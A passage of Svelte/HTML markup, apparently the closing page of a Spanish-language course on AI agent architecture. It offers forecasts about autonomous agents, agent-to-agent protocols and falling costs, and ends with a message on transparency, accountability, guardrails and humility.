          <p class="text-sm text-agent-muted leading-relaxed mb-3">
            Un usuario pregunta: "Que herramienta uso?" Un arquitecto pregunta: "Cual es el nivel de complejidad correcto para este problema, cuanto estoy dispuesto a pagar, que pasa cuando falla, y como se que funciona?"
          </p>
          <p class="text-sm text-agent-muted leading-relaxed">
            La tecnologia de agentes IA evoluciona rapido. Los modelos mejoran, las herramientas cambian, los frameworks aparecen y desaparecen. Pero los principios de arquitectura que aprendiste aqui — simplicidad, separacion de responsabilidades, guardrails, observabilidad, resiliencia — esos son <strong class="text-agent-text">atemporales</strong>.
          </p>
        </div>

        <!-- El Futuro -->
        <div class="bg-agent-dark border border-agent-border/50 rounded-lg p-5 text-left max-w-lg mx-auto mb-6">
          <h3 class="text-lg font-bold text-agent-text mb-3">Que viene despues</h3>
          <div class="space-y-3">
            <div class="flex items-start gap-2">
              <span class="text-agent-accent shrink-0 text-sm">&#9654;</span>
              <div>
                <p class="text-sm font-bold text-agent-text">Agentes autonomos 24/7</p>
                <p class="text-xs text-agent-muted">Los harnesses (Modulo 12) evolucionaran a agentes que corren continuamente: monitoreando repos, respondiendo issues, y manteniendo codigo. El humano supervisara, no ejecutara.</p>
              </div>
            </div>
            <div class="flex items-start gap-2">
              <span class="text-agent-accent shrink-0 text-sm">&#9654;</span>
              <div>
                <p class="text-sm font-bold text-agent-text">Protocolo A2A (Agent-to-Agent)</p>
                <p class="text-xs text-agent-muted">Asi como MCP estandarizo la comunicacion agente-herramienta, A2A estandarizara la comunicacion entre agentes de diferentes proveedores. Tus agentes de Claude hablaran nativamente con agentes de OpenAI.</p>
              </div>
            </div>
            <div class="flex items-start gap-2">
              <span class="text-agent-accent shrink-0 text-sm">&#9654;</span>
              <div>
                <p class="text-sm font-bold text-agent-text">Deflacion de costos 10x cada 18 meses</p>
                <p class="text-xs text-agent-muted">Lo que hoy cuesta $3,000/mes costara $300 en 2028. Las arquitecturas que hoy son "caras" se convertiran en el estandar. Disenadas correctamente, escalaran sin cambios.</p>
              </div>
            </div>
            <div class="flex items-start gap-2">
              <span class="text-agent-accent shrink-0 text-sm">&#9654;</span>
              <div>
                <p class="text-sm font-bold text-agent-text">El rol del humano cambia</p>
                <p class="text-xs text-agent-muted">De "escribir codigo" a "disenar sistemas de agentes que escriben codigo". El Agent Architect es el nuevo rol de liderazgo tecnico. Y tu ya tienes las bases.</p>
              </div>
            </div>
          </div>
        </div>

        <!-- Final responsibility message -->
        <div class="bg-agent-card border border-agent-accent/20 rounded-lg p-5 text-left max-w-lg mx-auto">
          <h3 class="text-lg font-bold text-agent-text mb-3">La Responsabilidad del Arquitecto</h3>
          <p class="text-sm text-agent-muted leading-relaxed mb-3">
            Disenar sistemas de agentes IA es un poder real. Tus decisiones impactan la productividad de equipos enteros, la seguridad de sistemas en produccion, y los costos de empresas.
          </p>
          <p class="text-sm text-agent-muted leading-relaxed mb-3">
            Con ese poder viene responsabilidad: <strong class="text-agent-text">transparencia</strong> (los usuarios saben que un agente los asiste), <strong class="text-agent-text">accountability</strong> (cada decision del agente es auditable), <strong class="text-agent-text">seguridad</strong> (guardrails no son opcionales), y <strong class="text-agent-text">humildad</strong> (saber cuando un agente NO es la solucion).
          </p>
          <p class="text-sm text-agent-accent leading-relaxed font-semibold">
            Bienvenido al rol de Agent Architect. Ahora ve y construye algo que importe.
          </p>
        </div>
      </div>
    </section>
  {/if}

  <!-- Sources -->
  <SourcesSection sources={mod.sources} />

  <!-- Navigation -->
  <ModuleNav currentModule={MODULE_ID} />
</div>

<!-- Floating Vocabulary -->
<VocabularyFloat moduleId={MODULE_ID} />

<!-- Badge Notification -->
{#if showBadge && badgeQueue.length > 0}
  <BadgeNotification badge={badgeQueue[0]} onClose={handleBadgeClose} />
{/if}
